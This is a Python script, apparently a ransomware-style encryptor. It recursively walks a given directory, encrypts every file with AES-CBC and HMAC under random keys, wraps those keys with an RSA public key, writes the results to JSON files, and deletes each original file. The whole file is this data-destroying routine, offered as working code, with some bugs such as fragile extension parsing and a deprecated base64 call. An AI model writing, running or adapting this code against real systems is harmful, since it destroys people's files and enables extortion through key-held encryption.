import base64
import json
from GetKeys import *
from os import walk,path, urandom,remove
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding

def MyencryptMAC(message,EncKey,HMACKey):
	backend = default_backend()
	padder = padding.PKCS7(128).padder() #set up padding
	padded_data = padder.update(message) + padder.finalize() #padding = setUP + remainder
	iv = urandom(16) # initialize vector
	cipher = Cipher(algorithms.AES(EncKey), modes.CBC(iv), backend=backend) # Cipher objects combine an algorithm such as AES with a mode like CBC or CTR
	encryptor = cipher.encryptor() # set up encryption block
	ct = encryptor.update(padded_data) + encryptor.finalize()#create cipher text
	h = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend()) #HASH Generated
	h.update(ct)#pass cypher text into hash
	return ct,iv,h.finalize() #return cypher text, initialize vector, hash

def MyfileEncryptMAC(filepath):
    HMACKey = urandom(32) # generate 32byte secret key
    EncKey = urandom(32) #Generate encryption key
    days_file = open(filepath,'rb') #open file and read string
    extension = filepath.split(".") # seperate the file name from extension
    #note when you split you lose the dot in "./" forward slash, that is why a "." is added to get the current directory
    extension = "." + extension[1]
    with open(filepath,'rb') as binary_file: #read file in bytes
            data = binary_file.read() #Read the whole file at once
    answer = MyencryptMAC(data,EncKey,HMACKey) #pass message,key
    return answer,EncKey,HMACKey,extension #return cypher, iv, hash, encryption key, hash key

def MyRSAEncrypt(filePath, RSA_Path):
    EncryInfo = MyfileEncryptMAC(filePath)  # call file encryption

    RSA_Keys = GetPrivateandPublicKey(RSA_Path)  # Get the private and public key

    RSA_Public_Key = RSA_Keys[1]  # This is the public key
    key = EncryInfo[1] + EncryInfo[2]  # This is the encryption and HMAC Keys concatenated
    # create RSA cipher text using public key, encryption + HMAC key, and OAEP padding
    RSAciphertext = RSA_Public_Key.encrypt(key, rsa_padding.OAEP(mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
                                                                 algorithm=hashes.SHA256(), label=None))
    # this is rsa cipher, cipher, IV, tag, ext
    return RSAciphertext, EncryInfo[0][0], EncryInfo[0][1], EncryInfo[0][2], EncryInfo[3]


def jsonEncry(Directory_Path):
    RSA_Path = './' #curren directory of the program
    privateKeyFileName = 'privatekey.pem' #private key file name
    privateKey = RSA_Path + privateKeyFileName #this is the private key file path
    #get all file name from the starting directory
    for (dirpath, dirnames, filenames) in walk(Directory_Path):
        for filename in filenames:
            filePath = path.join(dirpath, filename)
            file = filename.split(".")
            jsonName = path.join(dirpath,file[0]+".json") #new json encryption file name

            #store encryption attributes into json file
            with open(jsonName, "w") as fb:
                    #get encryption attributes: RSA cipher, Cipher text, IV, tag, ext
                    #Then decode bytes into string using ascii format
                    EncryptionInfo = MyRSAEncrypt(filePath,RSA_Path)
                    RSAC = base64.encodestring(EncryptionInfo[0]).decode('ascii')
                    C = base64.encodestring(EncryptionInfo[1]).decode('ascii')
                    IV = base64.encodestring(EncryptionInfo[2]).decode('ascii')
                    tag = base64.encodestring(EncryptionInfo[3]).decode('ascii')
                    ext = EncryptionInfo[4]
                    #Dump into the file
                    fb.write(json.dumps({'RSA_ciphertext' : RSAC, 'AES_ciphertext' : C, 'IV' : IV, 'tag' : tag, 'ext':ext }))

            remove(filePath) #remove the text filess